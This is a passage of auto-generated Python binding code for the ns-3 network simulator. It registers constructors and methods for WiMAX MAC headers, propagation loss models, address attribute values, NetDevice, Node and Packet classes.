cls.add_method('SetNrDlBurstProfiles',
'void',
[param('uint8_t', 'nrDlBurstProfiles')])
return
def register_Ns3DlMap_methods(root_module, cls):
cls.add_constructor([param('ns3::DlMap const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlMapElement',
'void',
[param('ns3::OfdmDlMapIe', 'dlMapElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetDcdCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlMapElements',
'std::list< ns3::OfdmDlMapIe >',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationID')])
cls.add_method('SetDcdCount',
'void',
[param('uint8_t', 'dcdCount')])
return
def register_Ns3DsaAck_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaAck const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetConfirmationCode',
'uint16_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetConfirmationCode',
'void',
[param('uint16_t', 'confirmationCode')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3DsaReq_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaReq const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::ServiceFlow', 'sf')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'sfid')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3DsaRsp_methods(root_module, cls):
cls.add_constructor([param('ns3::DsaRsp const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetConfirmationCode',
'uint16_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetConfirmationCode',
'void',
[param('uint16_t', 'confirmationCode')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'sfid')])
cls.add_method('SetTransactionId',
'void',
[param('uint16_t', 'transactionId')])
return
def register_Ns3EmptyAttributeValue_methods(root_module, cls):
cls.add_constructor([param('ns3::EmptyAttributeValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
visibility='private', is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3EventImpl_methods(root_module, cls):
cls.add_constructor([param('ns3::EventImpl const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Cancel',
'void',
[])
cls.add_method('Invoke',
'void',
[])
cls.add_method('IsCancelled',
'bool',
[])
cls.add_method('Notify',
'void',
[],
is_pure_virtual=True, visibility='protected', is_virtual=True)
return
def register_Ns3FixedRssLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetRss',
'void',
[param('double', 'rss')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3FragmentationSubheader_methods(root_module, cls):
cls.add_constructor([param('ns3::FragmentationSubheader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetFc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFsn',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetFc',
'void',
[param('uint8_t', 'fc')])
cls.add_method('SetFsn',
'void',
[param('uint8_t', 'fsn')])
return
def register_Ns3FriisPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLambda',
'void',
[param('double', 'frequency'), param('double', 'speed')])
cls.add_method('SetLambda',
'void',
[param('double', 'lambda')])
cls.add_method('SetSystemLoss',
'void',
[param('double', 'systemLoss')])
cls.add_method('SetMinDistance',
'void',
[param('double', 'minDistance')])
cls.add_method('GetMinDistance',
'double',
[],
is_const=True)
cls.add_method('GetLambda',
'double',
[],
is_const=True)
cls.add_method('GetSystemLoss',
'double',
[],
is_const=True)
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3GenericMacHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::GenericMacHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetCi',
'uint8_t',
[],
is_const=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetEc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetEks',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHt',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetLen',
'uint16_t',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetCi',
'void',
[param('uint8_t', 'ci')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetEc',
'void',
[param('uint8_t', 'ec')])
cls.add_method('SetEks',
'void',
[param('uint8_t', 'eks')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
cls.add_method('SetHt',
'void',
[param('uint8_t', 'HT')])
cls.add_method('SetLen',
'void',
[param('uint16_t', 'len')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('check_hcs',
'bool',
[],
is_const=True)
return
def register_Ns3GrantManagementSubheader_methods(root_module, cls):
cls.add_constructor([param('ns3::GrantManagementSubheader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetPbr',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPm',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSi',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetPbr',
'void',
[param('uint16_t', 'pbr')])
cls.add_method('SetPm',
'void',
[param('uint8_t', 'pm')])
cls.add_method('SetSi',
'void',
[param('uint8_t', 'si')])
return
def register_Ns3IpcsClassifier_methods(root_module, cls):
cls.add_constructor([param('ns3::IpcsClassifier const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Classify',
'ns3::ServiceFlow *',
[param('ns3::Ptr< ns3::Packet const >', 'packet'), param('ns3::Ptr< ns3::ServiceFlowManager >', 'sfm'), param('ns3::ServiceFlow::Direction', 'dir')])
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3Ipv4AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressChecker const &', 'arg0')])
return
def register_Ns3Ipv4AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv4Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv4Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv4Address const &', 'value')])
return
def register_Ns3Ipv4MaskChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4MaskChecker const &', 'arg0')])
return
def register_Ns3Ipv4MaskValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4MaskValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv4Mask const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv4Mask',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv4Mask const &', 'value')])
return
def register_Ns3Ipv6AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6AddressChecker const &', 'arg0')])
return
def register_Ns3Ipv6AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv6Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv6Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv6Address const &', 'value')])
return
def register_Ns3Ipv6PrefixChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6PrefixChecker const &', 'arg0')])
return
def register_Ns3Ipv6PrefixValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv6PrefixValue const &', 'arg0')])
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Ipv6Prefix',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Ipv6Prefix const &', 'value')])
return
def register_Ns3LogDistancePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetPathLossExponent',
'void',
[param('double', 'n')])
cls.add_method('GetPathLossExponent',
'double',
[],
is_const=True)
cls.add_method('SetReference',
'void',
[param('double', 'referenceDistance'), param('double', 'referenceLoss')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Mac48AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48AddressChecker const &', 'arg0')])
return
def register_Ns3Mac48AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Mac48Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Mac48Address const &', 'value')])
return
def register_Ns3MatrixPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLoss',
'void',
[param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b'), param('double', 'loss'), param('bool', 'symmetric', default_value='true')])
cls.add_method('SetDefaultLoss',
'void',
[param('double', 'arg0')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3NakagamiPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3NetDevice_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::NetDevice const &', 'arg0')])
cls.add_method('AddLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetAddress',
'ns3::Address',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetBroadcast',
'ns3::Address',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetIfIndex',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMtu',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv6Address', 'addr')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetNode',
'ns3::Ptr< ns3::Node >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsBridge',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsLinkUp',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsMulticast',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('IsPointToPoint',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('NeedsArp',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Send',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SendFrom',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetAddress',
'void',
[param('ns3::Address', 'address')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetIfIndex',
'void',
[param('uint32_t const', 'index')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetMtu',
'bool',
[param('uint16_t const', 'mtu')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetNode',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetPromiscReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SupportsSendFrom',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3NixVector_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::NixVector const &', 'o')])
cls.add_method('AddNeighborIndex',
'void',
[param('uint32_t', 'newBits'), param('uint32_t', 'numberOfBits')])
cls.add_method('BitCount',
'uint32_t',
[param('uint32_t', 'numberOfNeighbors')],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::NixVector >',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint32_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ExtractNeighborIndex',
'uint32_t',
[param('uint32_t', 'numberOfBits')])
cls.add_method('GetRemainingBits',
'uint32_t',
[])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('Serialize',
'uint32_t',
[param('uint32_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3Node_methods(root_module, cls):
cls.add_constructor([param('ns3::Node const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'systemId')])
cls.add_method('AddApplication',
'uint32_t',
[param('ns3::Ptr< ns3::Application >', 'application')])
cls.add_method('AddDevice',
'uint32_t',
[param('ns3::Ptr< ns3::NetDevice >', 'device')])
cls.add_method('ChecksumEnabled',
'bool',
[],
is_static=True)
cls.add_method('GetApplication',
'ns3::Ptr< ns3::Application >',
[param('uint32_t', 'index')],
is_const=True)
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'index')],
is_const=True)
cls.add_method('GetId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNApplications',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSystemId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('RegisterDeviceAdditionListener',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])
cls.add_method('RegisterProtocolHandler',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler'), param('uint16_t', 'protocolType'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('UnregisterDeviceAdditionListener',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])
cls.add_method('UnregisterProtocolHandler',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler')])
cls.add_method('DoDispose',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('DoStart',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectFactoryChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectFactoryChecker const &', 'arg0')])
return
def register_Ns3ObjectFactoryValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectFactoryValue const &', 'arg0')])
cls.add_constructor([param('ns3::ObjectFactory const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::ObjectFactory',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::ObjectFactory const &', 'value')])
return
def register_Ns3OutputStreamWrapper_methods(root_module, cls):
cls.add_constructor([param('ns3::OutputStreamWrapper const &', 'arg0')])
cls.add_constructor([param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode')])
cls.add_constructor([param('std::ostream *', 'os')])
cls.add_method('GetStream',
'std::ostream *',
[])
return
def register_Ns3Packet_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Packet const &', 'o')])
cls.add_constructor([param('uint32_t', 'size')])
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size'), param('bool', 'magic')])
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::Ptr< ns3::Packet const >', 'packet')])
cls.add_method('AddByteTag',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('AddHeader',
'void',
[param('ns3::Header const &', 'header')])
cls.add_method('AddPacketTag',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('AddPaddingAtEnd',
'void',
[param('uint32_t', 'size')])
cls.add_method('AddTrailer',
'void',
[param('ns3::Trailer const &', 'trailer')])
cls.add_method('BeginItem',
'ns3::PacketMetadata::ItemIterator',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::Packet >',
[],
is_const=True)
cls.add_method('CopyData',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CopyData',
'void',
[param('std::ostream *', 'os'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::Ptr< ns3::Packet >',
[param('uint32_t', 'start'), param('uint32_t', 'length')],
is_const=True)
cls.add_method('EnableChecking',
'void',
[],
is_static=True)
cls.add_method('EnablePrinting',
'void',
[],
is_static=True)
cls.add_method('FindFirstMatchingByteTag',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetByteTagIterator',
'ns3::ByteTagIterator',
[],
is_const=True)
cls.add_method('GetNixVector',
'ns3::Ptr< ns3::NixVector >',
[],
is_const=True)
cls.add_method('GetPacketTagIterator',
'ns3::PacketTagIterator',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint64_t',
[],
is_const=True)
cls.add_method('PeekData',
'uint8_t const *',
[],
deprecated=True, is_const=True)
cls.add_method('PeekHeader',
'uint32_t',
[param('ns3::Header &', 'header')],
is_const=True)
cls.add_method('PeekPacketTag',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('PeekTrailer',
'uint32_t',
[param('ns3::Trailer &', 'trailer')])
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('PrintByteTags',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('PrintPacketTags',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('RemoveAllByteTags',
'void',
[])
cls.add_method('RemoveAllPacketTags',
'void',
[])
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'size')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'size')])
cls.add_method('RemoveHeader',
'uint32_t',
[param('ns3::Header &', 'header')])
cls.add_method('RemovePacketTag',
'bool',
[param('ns3::Tag &', 'tag')])
cls.add_method('RemoveTrailer',
'uint32_t',
[param('ns3::Trailer &', 'trailer')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
cls.add_method('SetNixVector',
'void',
[param('ns3::Ptr< ns3::NixVector >', 'arg0')])
return
